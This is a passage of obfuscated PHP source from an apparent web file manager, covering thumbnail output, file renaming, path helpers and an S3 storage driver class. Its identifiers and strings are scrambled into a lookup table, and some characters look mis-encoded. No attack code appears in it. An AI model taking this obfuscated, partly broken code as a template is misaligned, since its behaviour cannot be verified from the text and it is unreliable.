$–¡€¥£[175]) { return $this->fileOut($¯“ñùš, !1, $­‡ó¤«–); } if (isset($„æ×æÚÜ[$–¡€¥£[170]][$–¡€¥£[176]])) { $×ôö÷à¬ = $„æ×æÚÜ[$–¡€¥£[170]][$–¡€¥£[176]]; } else { if (isset($„æ×æÚÜ[$–¡€¥£[170]][$–¡€¥£[177]])) { $×ôö÷à¬ = $„æ×æÚÜ[$–¡€¥£[170]][$–¡€¥£[177]]; } } if (!$×ôö÷à¬) { $×ôö÷à¬ = md5("{$„æ×æÚÜ[$–¡€¥£[32]]}\x5f{$„æ×æÚÜ[$–¡€¥£[84]]}\x5f{$„æ×æÚÜ[$–¡€¥£[76]]}\x5f{$µ©³äóÀ}"); } $¸õ¬ê‰µ = "{$×ôö÷à¬}\x5f{$µ©³äóÀ}\x2e\x70\156\x67"; if (!($Âè›àÚ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $–¡€¥£[178]))) { $¼éåã™™ = IO::mkdir(IO_PATH_SYSTEM_TEMP . $–¡€¥£[179]); } else { $¼éåã™™ = KodIO::make($Âè›àÚ); } if ($Âè›àÚ = IO::fileNameExist($¼éåã™™, $¸õ¬ê‰µ)) { $†Òºµª‡ = KodIO::make($Âè›àÚ); return IO::fileOut($†Òºµª‡, !1, $­‡ó¤«–); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } $†Òºµª‡ = DATA_THUMB . $¸õ¬ê‰µ; del_file($†Òºµª‡); if (!@file_exists($†Òºµª‡)) { $¯†œê–  = TEMP_FILES; if (!is_dir($¯†œê– )) { mk_dir($¯†œê– ); } $‡æ­£Á± = $¯†œê–  . $×ôö÷à¬ . $–¡€¥£[10] . $„æ×æÚÜ[$–¡€¥£[174]]; if (!@file_exists($‡æ­£Á±)) { $‡æ­£Á± = $this->download($¯“ñùš, $‡æ­£Á±); } ImageThumb::createThumb($‡æ­£Á±, $†Òºµª‡, $µ©³äóÀ, $µ©³äóÀ * 10); } if (!file_exists($†Òºµª‡) || filesize($†Òºµª‡) < 100) { return @file_exists($‡æ­£Á±) ? IO::fileOut($‡æ­£Á±) : $this->fileOut($¯“ñùš); } if (!($Ó§Ù™–ƒ = IO::move($†Òºµª‡, $¼éåã™™))) { return IO::fileOut($†Òºµª‡); } del_file($†Òºµª‡); IO::fileOut($Ó§Ù™–ƒ); } public function fileOutImageServer($í—àâËì, $‰ü’¬¤¿ = 250) { $this->fileOutImage($í—àâËì, $‰ü’¬¤¿); } public function fileNameAuto($¢è½Úó¤, $©ÉÜ‰Î, $Û˜½Ùà = REPEAT_RENAME, $õ§—î¼ = false) { $Ü€ãß²Ğ =& $_SERVER[­á Ş³Ö]; $½¼’ìí = $¢è½Úó¤ === $Ü€ãß²Ğ[12] ? $©ÉÜ‰Î : rtrim($¢è½Úó¤, $Ü€ãß²Ğ[8]) . $Ü€ãß²Ğ[8] . $©ÉÜ‰Î; if ($Û˜½Ùà == REPEAT_REPLACE || !$this->exist($½¼’ìí) || $õ§—î¼ && $Û˜½Ùà != REPEAT_RENAME_FOLDER) { return $©ÉÜ‰Î; } if ($Û˜½Ùà == REPEAT_SKIP) { return !1; } $ÈØúë¢ = $Ü€ãß²Ğ[10] . get_path_ext($©ÉÜ‰Î); $ÈØúë¢ = $ÈØúë¢ == $Ü€ãß²Ğ[10] || $õ§—î¼ ? $Ü€ãß²Ğ[12] : $ÈØúë¢; $ÙÖñãèû = 1; $ŠÂİ‡µİ = substr($©ÉÜ‰Î, 0, strlen($©ÉÜ‰Î) - strlen($ÈØúë¢)); $„Ì‡ôçˆ = $ŠÂİ‡µİ . "\50{$ÙÖñãèû}\51{$ÈØúë¢}"; while ($this->exist(rtrim($¢è½Úó¤, $Ü€ãß²Ğ[8]) . $Ü€ãß²Ğ[8] . $„Ì‡ôçˆ)) { $„Ì‡ôçˆ = $ŠÂİ‡µİ . "\x28{$ÙÖñãèû}\51{$ÈØúë¢}"; $ÙÖñãèû++; } return $„Ì‡ôçˆ; } private function fileNameAutoList($§“Í»øı, $Ê¢¢š, $«õ†«¶º = false) { $¶Î¸“Üë =& $_SERVER[­á Ş³Ö]; $Æİ Øô• = $this->listPath($§“Í»øı, !0); $Æİ Øô• = array_merge($Æİ Øô•[$¶Î¸“Üë[82]], $Æİ Øô•[$¶Î¸“Üë[83]]); $øÀ€éèÏ = array_to_keyvalue($Æİ Øô•, $¶Î¸“Üë[12], $¶Î¸“Üë[32]); $³ÛÑÆÈ¬ = $¶Î¸“Üë[10] . get_path_ext($Ê¢¢š); $³ÛÑÆÈ¬ = $³ÛÑÆÈ¬ == $¶Î¸“Üë[10] || $«õ†«¶º ? $¶Î¸“Üë[12] : $³ÛÑÆÈ¬; $™¡ş÷—° = substr($Ê¢¢š, 0, strlen($Ê¢¢š) - strlen($³ÛÑÆÈ¬)); $¡®›·°Ò = $™¡ş÷—° . "\50\x30\51{$³ÛÑÆÈ¬}"; for ($ùËª¹Ô‡ = 1; $ùËª¹Ô‡ <= count($øÀ€éèÏ) + 1; $ùËª¹Ô‡++) { $¡®›·°Ò = $™¡ş÷—° . "\x28{$ùËª¹Ô‡}\x29{$³ÛÑÆÈ¬}"; if (!in_array_not_case($¡®›·°Ò, $øÀ€éèÏ)) { return $¡®›·°Ò; } } return $¡®›·°Ò; } public function listAllFiles($ÅÑ‡Óî¤, $§²ï‡ş) { $¨òåÛ‰º =& $_SERVER[­á Ş³Ö]; if (empty($§²ï‡ş)) { return array(); } $˜ÜŠ„Â– = array_keys($§²ï‡ş); $ÌÖ…õ·‘ = array(); $ÅÑ‡Óî¤ = trim($ÅÑ‡Óî¤, $¨òåÛ‰º[8]); foreach ($§²ï‡ş as $…ç¿¦İ => $Ú…¸ßâî) { $Ğ•îÂ = ltrim(substr(trim($…ç¿¦İ, $¨òåÛ‰º[8]), strlen($ÅÑ‡Óî¤)), $¨òåÛ‰º[8]); if (substr($…ç¿¦İ, -1) == $¨òåÛ‰º[8]) { $Ğ•îÂ = rtrim($Ğ•îÂ, $¨òåÛ‰º[8]) . $¨òåÛ‰º[8]; } $ÌÖ…õ·‘ = array_merge($ÌÖ…õ·‘, $this->slicePath($Ğ•îÂ)); } $ßõĞôÏ‘ = array(); foreach (array_unique($ÌÖ…õ·‘) as $Ñ”¾ÕÈÑ) { $ÌåõŠü· = array($¨òåÛ‰º[84] => $this->getPathOuter($¨òåÛ‰º[8] . $ÅÑ‡Óî¤ . $¨òåÛ‰º[8] . $Ñ”¾ÕÈÑ), $¨òåÛ‰º[75] => 1, $¨òåÛ‰º[76] => 0); if (substr($Ñ”¾ÕÈÑ, -1) != $¨òåÛ‰º[8]) { $ÌåõŠü·[$¨òåÛ‰º[75]] = 0; $ÒäË¨œê = $this->getPath($ÅÑ‡Óî¤ . $¨òåÛ‰º[8] . $Ñ”¾ÕÈÑ); if (isset($§²ï‡ş[$ÒäË¨œê])) { $åŸòøÜÃ = $§²ï‡ş[$ÒäË¨œê]; if (isset($åŸòøÜÃ[$¨òåÛ‰º[76]])) { $ÌåõŠü·[$¨òåÛ‰º[76]] = intval($åŸòøÜÃ[$¨òåÛ‰º[76]]); } if (isset($åŸòøÜÃ[$¨òåÛ‰º[180]])) { $ÌåõŠü·[$¨òåÛ‰º[85]] = intval($åŸòøÜÃ[$¨òåÛ‰º[180]]); } } } $ßõĞôÏ‘[] = $ÌåõŠü·; } return $ßõĞôÏ‘; } public function slicePath($Á»œÆÎ”) { $Ï«¥öìı =& $_SERVER[­á Ş³Ö]; $µØ¢ÒÌ– = explode($Ï«¥öìı[8], trim($Á»œÆÎ”, $Ï«¥öìı[8])); $±âç¤¡ = 0; do { ++$±âç¤¡; $›íÔİƒ[] = implode($Ï«¥öìı[8], array_slice($µØ¢ÒÌ–, 0, $±âç¤¡)) . $Ï«¥öìı[8]; } while ($±âç¤¡ < count($µØ¢ÒÌ–)); $›íÔİƒ[count($µØ¢ÒÌ–) - 1] = $Á»œÆÎ”; return $›íÔİƒ; } public function getHost() { $÷†Ç¬ÍÚ =& $_SERVER[­á Ş³Ö]; $ôáà¼©ò = parse_url(trim($this->domain, $÷†Ç¬ÍÚ[8])); $³„¹›òœ = isset($ôáà¼©ò[$÷†Ç¬ÍÚ[181]]) ? $ôáà¼©ò[$÷†Ç¬ÍÚ[181]] : http_type(); $ˆ‰¸ŸÒÆ = isset($ôáà¼©ò[$÷†Ç¬ÍÚ[182]]) ? $ôáà¼©ò[$÷†Ç¬ÍÚ[182]] : $ôáà¼©ò[$÷†Ç¬ÍÚ[84]]; if (isset($ôáà¼©ò[$÷†Ç¬ÍÚ[183]])) { $ˆ‰¸ŸÒÆ .= $÷†Ç¬ÍÚ[4] . $ôáà¼©ò[$÷†Ç¬ÍÚ[183]]; } return $³„¹›òœ . $÷†Ç¬ÍÚ[184] . $ˆ‰¸ŸÒÆ; } public function pathEncode($í‰¬¾éæ) { $µ¬¢é¥Ö =& $_SERVER[­á Ş³Ö]; return str_replace($µ¬¢é¥Ö[185], $µ¬¢é¥Ö[8], rawurlencode($í‰¬¾éæ)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\x34"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($ÎŒÜ«²¿) { set_timeout(); require_once SDK_DIR . $_SERVER[­á Ş³Ö][186]; parent::__construct(); $this->_init($ÎŒÜ«²¿); } public function _init($’šëŞÜ) { $this->config = $’šëŞÜ; foreach ($’šëŞÜ as $ó­§ËüÈ => $Çêñªí¤) { if (isset($this->{$ó­§ËüÈ})) { $this->{$ó­§ËüÈ} = $Çêñªí¤; } } $this->endpoint = $’šëŞÜ[$_SERVER[­á Ş³Ö][187]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($¬ß¨™ãˆ = "\166\x34") { $this->signVer = $¬ß¨™ãˆ; $this->client->setSignatureVersion($¬ß¨™ãˆ); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { $Úµüœ½Ş =& $_SERVER[­á Ş³Ö]; $©·ÚÉ„„ = $this->getBucketCors(); if (!$©·ÚÉ„„ || !is_array($©·ÚÉ„„)) { return !1; } if ($©·ÚÉ„„[$Úµüœ½Ş[188]] != $Úµüœ½Ş[189] || $©·ÚÉ„„[$Úµüœ½Ş[190]] != $Úµüœ½Ş[189]) { return !1; } $ÆÜŞòİ = array_map($Úµüœ½Ş[191], $©·ÚÉ„„[$Úµüœ½Ş[192]]); if (!is_array($ÆÜŞòİ)) { $ÆÜŞòİ = array(); } $¢Ü”æ¹á = array($Úµüœ½Ş[193], $Úµüœ½Ş[194], $Úµüœ½Ş[195], $Úµüœ½Ş[196], $Úµüœ½Ş[197]); $®¥Îæ¶ = array_diff($¢Ü”æ¹á, $ÆÜŞòİ); return empty($®¥Îæ¶); } public function mkfile($öÇşğ•Ô, $¢»Òö = '', $è¤ÃÒÍ‹ = REPEAT_RENAME) { $ÀÜ«™Šı = $this->setContent($öÇşğ•Ô, $¢»Òö); if ($ÀÜ«™Šı !== !1) { return $this->getPathOuter($öÇşğ•Ô); } return !1; } public function mkdir($àáÎö¤ô, $ˆ¼¢Ñõ¼ = REPEAT_SKIP) { $å»åŠâ =& $_SERVER[­á Ş³Ö]; if (empty($àáÎö¤ô) && $àáÎö¤ô !== $å»åŠâ[198]) { return !1; } if ($ˆ¼¢Ñõ¼ && $this->_isFolder($àáÎö¤ô)) { return $this->getPathOuter($àáÎö¤ô); } $«’Ìğö = $this->setContent($àáÎö¤ô, $å»åŠâ[12], !0); if ($«’Ìğö !== !1) { return $this->getPathOuter($àáÎö¤ô); } return !1; } public function copyFile($Šõòšñ, $ƒ›…ğŞÈ, $ñ†¹ñ„ = array()) { $„µ…ıÍÕ =& $_SERVER[­á Ş³Ö]; $¸Õ¶’‹ã = $this->objectMeta($Šõòšñ); if (!$¸Õ¶’‹ã) { return !1; } if ($¸Õ¶’‹ã[$„µ…ıÍÕ[76]] <= 1024 * 1024 * 200) { $Õå¦÷Íğ = $this->client->copyObject($this->bucket, $Šõòšñ, $this->bucket, $ƒ›…ğŞÈ, $„µ…ıÍÕ[199], $ñ†¹ñ„); } else { $Õå¦÷Íğ = $this->client->multiCopyObject($this->bucket, $Šõòšñ, $this->bucket, $ƒ›…ğŞÈ, $ñ†¹ñ„); } $Õå¦÷Íğ = $Õå¦÷Íğ ? $this->getPathOuter($ƒ›…ğŞÈ) : !1; return $Õå¦÷Íğ; } public function moveFile($øßÆ‘‚Ö, $Öà¨¥Úû) { if ($this->copyFile($øßÆ‘‚Ö, $Öà¨¥Úû)) { $this->delFile($øßÆ‘‚Ö); return $this->getPathOuter($Öà¨¥Úû); } return !1; } public function delFile($Ø­­ßš†) { return $this->client->deleteObject($this->bucket, $Ø­­ßš†); } public function delFolder($º—×µ©Í) { $Ò–úˆ³Ì =& $_SERVER[­á Ş³Ö]; if (!$this->exist($º—×µ©Í)) { return !0; } $this->listItemCache = !1; $‹‡êêƒ¼ = $this->fileList($º—×µ©Í); $this->listItemCache = !0; $çáÛÔá = trim($º—×µ©Í, $Ò–úˆ³Ì[8]) . $Ò–úˆ³Ì[8]; if (!empty($º—×µ©Í) && $º—×µ©Í !== $Ò–úˆ³Ì[198] && !in_array($çáÛÔá, $‹‡êêƒ¼[$Ò–úˆ³Ì[82]])) { $‹‡êêƒ¼[$Ò–úˆ³Ì[82]][] = $çáÛÔá; } $¨êÜˆ¢õ = $this->delByBatch($‹‡êêƒ¼[$Ò–úˆ³Ì[83]]); if (!$¨êÜˆ¢õ) { return !1; } $¨êÜˆ¢õ = $this->delByBatch($‹‡êêƒ¼[$Ò–úˆ³Ì[82]]); if (!$¨êÜˆ¢õ) { return !1; } return $this->delFile($çáÛÔá); } private function delByBatch($ôîä®şÀ) { foreach (array_chunk($ôîä®şÀ, 1000) as $àú™Í±‰) { $ ŠïèÔä = $this->client->deleteObjects($this->bucket, $àú™Í±‰); if (!$ ŠïèÔä) { return !1; } } return !0; } public function rename($«Î©»¶›, $Ö½¿õ“¼) { return $this->renameObject($«Î©»¶›, $Ö½¿õ“¼); } public function listPath($ôŸ™¦öé, $Š×ãç¿‡ = false) { $£ÙôÉÓÑ =& $_SERVER[­á Ş³Ö]; $„Ö­Ä‚ê = $this->fileList($ôŸ™¦öé, $£ÙôÉÓÑ[8], !0); foreach ($„Ö­Ä‚ê[$£ÙôÉÓÑ[82]] as $¾»Ÿ¯ì => $ßÄÛ×ù) { $„Ö­Ä‚ê[$£ÙôÉÓÑ[82]][$¾»Ÿ¯ì] = $this->folderInfo($ßÄÛ×ù, $Š×ãç¿‡, $ßÄÛ×ù); } foreach ($„Ö­Ä‚ê[$£ÙôÉÓÑ[83]] as $¾»Ÿ¯ì => $ßÄÛ×ù) { $„Ö­Ä‚ê[$£ÙôÉÓÑ[83]][$¾»Ÿ¯ì] = $this->fileInfo($ßÄÛ×ù[$£ÙôÉÓÑ[32]], $Š×ãç¿‡, $ßÄÛ×ù); } return $„Ö­Ä‚ê; } protected function infoChildren($¾ï²£ÚÀ, &$ÄÁàĞªä) { $Å¼£¶Ê¢ =& $_SERVER[­á Ş³Ö]; $¦ì¤¹ï = $this->fileList($¾ï²£ÚÀ, $Å¼£¶Ê¢[12], !0); $ÄÁàĞªä[$Å¼£¶Ê¢[78]] += count($¦ì¤¹ï[$Å¼£¶Ê¢[82]]); $ÄÁàĞªä[$Å¼£¶Ê¢[77]] += count($¦ì¤¹ï[$Å¼£¶Ê¢[83]]); foreach ($¦ì¤¹ï[$Å¼£¶Ê¢[83]] as $±öĞõúĞ) { if (!$±öĞõúĞ || !$±öĞõúĞ[$Å¼£¶Ê¢[76]]) { continue; } $ÄÁàĞªä[$Å¼£¶Ê¢[76]] += $±öĞõúĞ[$Å¼£¶Ê¢[76]]; } } private function fileInfo($ËĞÔ…‡, $°­ìƒ‹ç = false, $Êõíõ…É = array()) { $Û‡¡ğàÎ =& $_SERVER[­á Ş³Ö]; $ü¼œø°Ú = array($Û‡¡ğàÎ[32] => $this->pathThis($ËĞÔ…‡), $Û‡¡ğàÎ[84] => $this->getPathOuter($ËĞÔ…‡), $Û‡¡ğàÎ[33] => $Û‡¡ğàÎ[200], $Û‡¡ğàÎ[174] => $this->ext($ËĞÔ…‡), $Û‡¡ğàÎ[76] => isset($Êõíõ…É[$Û‡¡ğàÎ[76]]) ? $Êõíõ…É[$Û‡¡ğàÎ[76]] : 0); if ($°­ìƒ‹ç) { return $ü¼œø°Ú; } $ü¼œø°Ú[$Û‡¡ğàÎ[201]] = $ü¼œø°Ú[$Û‡¡ğàÎ[85]] = 0; $ü¼œø°Ú[$Û‡¡ğàÎ[202]] = $ü¼œø°Ú[$Û‡¡ğàÎ[203]] = !0; if (empty($Êõíõ…É)) { $Êõíõ…É = $this->objectMeta($ËĞÔ…‡); if (!$Êõíõ…É) { return $ü¼œø°Ú; } } if (isset($Êõíõ…É[$Û‡¡ğàÎ[180]])) { $ü¼œø°Ú[$Û‡¡ğàÎ[85]] = $Êõíõ…É[$Û‡¡ğàÎ[180]]; } if (isset($Êõíõ…É[$Û‡¡ğàÎ[76]])) { $ü¼œø°Ú[$Û‡¡ğàÎ[76]] = $Êõíõ…É[$Û‡¡ğàÎ[76]]; } return $ü¼œø°Ú; } private function folderInfo($Şòî´ä…, $Àğ»æµ = false, $èğÑŒ¡ = array()) { $†ğ„Û´Î =& $_SERVER[­á Ş³Ö]; $²ÈÆÅ¿¢ = array($†ğ„Û´Î[32] => $this->pathThis($Şòî´ä…), $†ğ„Û´Î[84] => $this->getPathOuter($†ğ„Û´Î[8] . $Şòî´ä…), $†ğ„Û´Î[33] => $†ğ„Û´Î[75]); if ($Àğ»æµ) { return $²ÈÆÅ¿¢; } $²ÈÆÅ¿¢[$†ğ„Û´Î[201]] = $²ÈÆÅ¿¢[$†ğ„Û´Î[85]] = 0; $²ÈÆÅ¿¢[$†ğ„Û´Î[202]] = $²ÈÆÅ¿¢[$†ğ„Û´Î[203]] = !0; if ($Şòî´ä… == $†ğ„Û´Î[12]) { return $²ÈÆÅ¿¢; } if (empty($èğÑŒ¡)) { $èğÑŒ¡ = $this->objectMeta(trim($Şòî´ä…, $†ğ„Û´Î[8]) . $†ğ„Û´Î[8]); } if (isset($èğÑŒ¡[$†ğ„Û´Î[180]])) { $²ÈÆÅ¿¢[$†ğ„Û´Î[201]] = $èğÑŒ¡[$†ğ„Û´Î[180]]; } return $²ÈÆÅ¿¢; } private function fileList($æõÜáöÁ, $Åşáø† = '', $Ü£ØùŒ« = 0) { $Û“ÙÔ• =& $_SERVER[­á Ş³Ö]; $½±Âèà© = rtrim($æõÜáöÁ, $Û“ÙÔ•[8]) . $Û“ÙÔ•[8]; $†ü…‚” = $this->listObjs($½±Âèà©, null, null, $Åşáø†); if (!$†ü…‚”) { return array($Û“ÙÔ•[82] => array(), $Û“ÙÔ•[83] => array()); } $ÙÀÙû¿ = $µ¡§Í÷Ô = array(); foreach ($†ü…‚”[$Û“ÙÔ•[204]] as $·éïˆã½) { $´‚šÛâÌ = $·éïˆã½[$Û“ÙÔ•[32]]; if ($´‚šÛâÌ == $½±Âèà©) { continue; } $ùÚÎ¥¥â = isset($·éïˆã½[$Û“ÙÔ•[76]]) ? $·éïˆã½[$Û“ÙÔ•[76]] : 0; $¨Îö³› = $ùÚÎ¥¥â == 0 && substr($´‚šÛâÌ, strlen($´‚šÛâÌ) - 1, 1) == $Û“ÙÔ•[8] ? !0 : !1; $this->cacheMethodInfoSet($´‚šÛâÌ, $¨Îö³›, $·éïˆã½); if ($¨Îö³›) { $ÙÀÙû¿[] = $´‚šÛâÌ; continue; } $µ¡§Í÷Ô[] = $Ü£ØùŒ« ? $·éïˆã½ : $´‚šÛâÌ; } foreach ($†ü…‚”[$Û“ÙÔ•[205]] as $·éïˆã½) { $ÙÀÙû¿[] = $·éïˆã½[$Û“ÙÔ•[32]]; $this->cacheMethodInfoSet($·éïˆã½[$Û“ÙÔ•[32]], !0); } $this->cacheMethodInfoSet($æõÜáöÁ, !0); return array($Û“ÙÔ•[82] => $ÙÀÙû¿, $Û“ÙÔ•[83] => $µ¡§Í÷Ô); } private function listObjs($€ƒê¸ë·, $ÅÄªñåä = null, $°©—®ò = null, $øÊ»¯Ÿ­ = null) { $â‚¨¥  =& $_SERVER[­á Ş³Ö]; $€ƒê¸ë· = trim($€ƒê¸ë·, $â‚¨¥ [8]); $¶÷áæ¡ï = empty($€ƒê¸ë·) && $€ƒê¸ë· !== $â‚¨¥ [198] ? $â‚¨¥ [12] : $€ƒê¸ë· . $â‚¨¥ [8]; return $this->client->getBucket($this->bucket, $¶÷áæ¡ï, $ÅÄªñåä, $°©—®ò, $øÊ»¯Ÿ­, !0); } public function has($ƒæ–Î×æ, $¬ğú°¼ = false, $ú­¶ë×º = true) { $È©…ôÊ„ =& $_SERVER[­á Ş³Ö]; $ƒæ–Î×æ = trim($ƒæ–Î×æ, $È©…ôÊ„[8]); $ÖÖ§Âü‡ = empty($ƒæ–Î×æ) && $ƒæ–Î×æ !== $È©…ôÊ„[198] ? $È©…ôÊ„[12] : $ƒæ–Î×æ . $È©…ôÊ„[8]; $†ğéü¸ë = null; $´–ä¹÷º = 500; $òºøã«¼ = $È©…ôÊ„[8]; $®·œÎôØ = $¡„ÍÀ¶› = array(); while (!0) { $îÌÁÊÉ¡ = $this->listObjs($ƒæ–Î×æ, $†ğéü¸ë, $´–ä¹÷º, $òºøã«¼); if (!$îÌÁÊÉ¡) { break; } $†ğéü¸ë = $îÌÁÊÉ¡[$È©…ôÊ„[206]]; $²û­ÀÑõ = $îÌÁÊÉ¡[$È©…ôÊ„[204]]; $´³¹½“Ü = $îÌÁÊÉ¡[$È©…ôÊ„[205]]; if (empty($²û­ÀÑõ) && empty($´³¹½“Ü)) { break; } if (count($²û­ÀÑõ) == 1 && $²û­ÀÑõ[0][$È©…ôÊ„[32]] == $ÖÖ§Âü‡) { break; } if ($¬ğú°¼) { if (count($²û­ÀÑõ)) { $²û­ÀÑõ = array_column($²û­ÀÑõ, $È©…ôÊ„[32]); $®·œÎôØ = array_merge($®·œÎôØ, $²û­ÀÑõ); } if (count($´³¹½“Ü)) { $´³¹½“Ü = array_column($´³¹½“Ü, $È©…ôÊ„[32]); $¡„ÍÀ¶› = array_merge($¡„ÍÀ¶›, $´³¹½“Ü); } if ($†ğéü¸ë === null) { break; } continue; } if ($ú­¶ë×º) { if (!empty($²û­ÀÑõ)) { if (count($²û­ÀÑõ) > 1 || isset($²û­ÀÑõ[0][$È©…ôÊ„[32]]) && $²û­ÀÑõ[0][$È©…ôÊ„[32]] != $ÖÖ§Âü‡) { return !0; } } } else { if (!empty($´³¹½“Ü)) { return !0; } } if ($†ğéü¸ë === null) { break; } } if ($¬ğú°¼) { $®·œÎôØ = array_diff($®·œÎôØ, array($ÖÖ§Âü‡)); $®·œÎôØ = count(array_unique($®·œÎôØ)); $¡„ÍÀ¶› = count(array_unique($¡„ÍÀ¶›)); return array($È©…ôÊ„[207] => $®·œÎôØ, $È©…ôÊ„[208] => $¡„ÍÀ¶›); } return !1; } public function listAll($µ¹Ô€§À) { $Àó«çÜ =& $_SERVER[­á Ş³Ö]; $Ø§ï¬»ï = $this->fileList($µ¹Ô€§À, $Àó«çÜ[12], !0); $„Ïïå½§ = array_to_keyvalue($Ø§ï¬»ï[$Àó«çÜ[83]], $Àó«çÜ[32]); foreach ($Ø§ï¬»ï[$Àó«çÜ[82]] as $¿ÑÇªñ‘) { if (is_string($¿ÑÇªñ‘)) { $„Ïïå½§[$¿ÑÇªñ‘] = array($Àó«çÜ[76] => 0); } } return $this->listAllFiles($µ¹Ô€§À, $„Ïïå½§); } public function canRead($—“„Ò›Ñ) { $œÓ–‰Ä =& $_SERVER[­á Ş³Ö]; $öŒ×Â¥ = $this->client->getAccessControlPolicy($this->bucket, $—“„Ò›Ñ); if (!$öŒ×Â¥) { return !1; } return in_array($öŒ×Â¥, array($œÓ–‰Ä[209], $œÓ–‰Ä[210], $œÓ–‰Ä[211])) ? !0 : !1; } public function canWrite($ ú»ñû³) { $ˆ‰½Ï¦Ì =& $_SERVER[­á Ş³Ö]; $ÅôÒ±Èš = $this->client->getAccessControlPolicy($this->bucket, $ ú»ñû³); if (!$ÅôÒ±Èš) { return !1; } return in_array($ÅôÒ±Èš, array($ˆ‰½Ï¦Ì[209], $ˆ‰½Ï¦Ì[210])) ? !0 : !1; } public function getContent($¥™ƒ×»º) { return $this->client->getObject($this->bucket, $¥™ƒ×»º); } public function setContent($‘‚é‹²‚, $õ´íùå = '', $©•¬ÑÕş = false) { $ááœŠ„ =& $_SERVER[­á Ş³Ö]; $‘‚é‹²‚ = $©•¬ÑÕş ? trim($‘‚é‹²‚, $ááœŠ„[8]) . $ááœŠ„[8] : $‘‚é‹²‚; $ªò¹ ÊŞ = get_file_mime(get_path_ext($‘‚é‹²‚)); $…´Şà„‹ = $this->client->putObject($õ´íùå, $this->bucket, $‘‚é‹²‚, $ááœŠ„[199], array(), $ªò¹ ÊŞ); if (!$…´Şà„‹) { return !1; } if ($©•¬ÑÕş) { return !0; } $this->cacheMethod(null, null); $…´Şà„‹ = $this->copyFile($‘‚é‹²‚, $‘‚é‹²‚, array($ááœŠ„[212] => $…´Şà„‹[$ááœŠ„[213]])); return $…´Şà„‹ ? !0 : !1; } public function fileSubstr($Ä» ÷àŒ, $Ùù²šîà, $“£­€ßà) { $»±õÒ´§ = $Ùù²šîà + $“£­€ßà - 1; return $this->client->getObject($this->bucket, $Ä» ÷àŒ, array($_SERVER[­á Ş³Ö][214] => "\x62\x79\164\145\x73\75{$Ùù²šîà}\55{$»±õÒ´§}")); } public function upload($•êå–²ó, $ø³šÓ·Ú, $üÉÌ´”Ğ = false, $ûôŞ—ŠŸ = REPEAT_REPLACE) { $ïš¤¢Ş› =& $_SERVER[­á Ş³Ö]; $Éìñ–ŸŒ = array($ïš¤¢Ş›[212] => @md5_file($ø³šÓ·Ú)); $Æç·Š = array($ïš¤¢Ş›[215] => get_file_mime(get_path_ext($•êå–²ó))); if (IO::size($ø³šÓ·Ú) <= 1024 * 1024 * 200) { $’ñ‹íÃ = $this->client->putObjectFile($ø³šÓ·Ú, $this->bucket, $•êå–²ó, $ïš¤¢Ş›[199], $Éìñ–ŸŒ, $Æç·Š); return !empty($’ñ‹íÃ) ? $this->getPathOuter($•êå–²ó) : !1; } $«‹ıÎ…í = $this->client->multiUploadObject($ø³šÓ·Ú, $this->bucket, trim($•êå–²ó, $ïš¤¢Ş›[8]), $Éìñ–ŸŒ, $Æç·Š); return $«‹ıÎ…í ? $this->getPathOuter($•êå–²ó) : !1; } public function download($ô¡Şœù‰, $·ƒÔ¨ªï) { if (!@is_dir($this->pathFather($·ƒÔ¨ªï)) && !IO::mkdir($this->pathFather($·ƒÔ¨ªï))) { return !1; } $î™©Ÿùş = $this->client->getObject($this->bucket, $ô¡Şœù‰, array(), $·ƒÔ¨ªï); return $î™©Ÿùş !== !1 ? $·ƒÔ¨ªï : !1; } public function link($©¥õÌ¹·, $”ë’ÚšŒ = array()) { $ÍøúÁ²Ü =& $_SERVER[­á Ş³Ö]; if ($this->signVer == $ÍøúÁ²Ü[216]) { return $this->client->getAuthenticatedURL($this->bucket, $©¥õÌ¹·, 3600 * 12, $”ë’ÚšŒ); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($©¥õÌ¹·, $ÍøúÁ²Ü[8]), 3600 * 12, $this->region, array(), !0, $”ë’ÚšŒ); } public function fileOut($Íğˆ·å‡, $µñÔ©İ¬ = false, $Ü¤óÒÅî = false, $ºËßº¤ò = '') { $Î–”ä =& $_SERVER[­á Ş³Ö]; if ($this->isFileOutServer()) { return $this->fileOutServer($Íğˆ·å‡, $µñÔ©İ¬, $Ü¤óÒÅî, $ºËßº¤ò); } if (!$Ü¤óÒÅî) { $Ü¤óÒÅî = $this->pathThis($Íğˆ·å‡); } $×µÙ„¯£ = get_file_mime(get_path_ext($Ü¤óÒÅî)); if ($×µÙ„¯£ == $Î–”ä[217]) { return parent::fileOut($Íğˆ·å‡, $µñÔ©İ¬, $Ü¤óÒÅî, $ºËßº¤ò); } $–ÀÃòªæ = array($Î–”ä[218] => $×µÙ„¯£); if ($µñÔ©İ¬) { $–ÀÃòªæ[$Î–”ä[219]] = $Î–”ä[220] . rawurlencode($Ü¤óÒÅî); } else { } $î˜ûı¡» = $this->link($Íğˆ·å‡, $–ÀÃòªæ); $this->fileOutLink($î˜ûı¡»); } public function fileOutServer($È“Éíâ„, $–…ñ–‹ = false, $äÜé°€ = false, $¼£›š˜ò = '') { parent::fileOut($È“Éíâ„, $–…ñ–‹, $äÜé°€, $¼£›š˜ò); } public function fileOutImageServer($µ‡û¸±®, $œñ±©ø¤ = 250) { parent::fileOutImage($µ‡û¸±®, $œñ±©ø¤); } public function hashMd5($©ì‘Ö“’, $Ö ½®¸² = '') { $ØóÏ¼Úƒ =& $_SERVER[­á Ş³Ö]; $¸±éˆ‹µ = $this->objectMeta($©ì‘Ö“’); if (!$¸±éˆ‹µ) { return !1; } $Ö ½®¸² = $Ö ½®¸² ? $Ö ½®¸² : _get($¸±éˆ‹µ, $ØóÏ¼Úƒ[221]); $Ö ½®¸² = $Ö ½®¸² ? $Ö ½®¸² : _get($¸±éˆ‹µ, $ØóÏ¼Úƒ[213], $ØóÏ¼Úƒ[12]); return $Ö ½®¸²; } public function 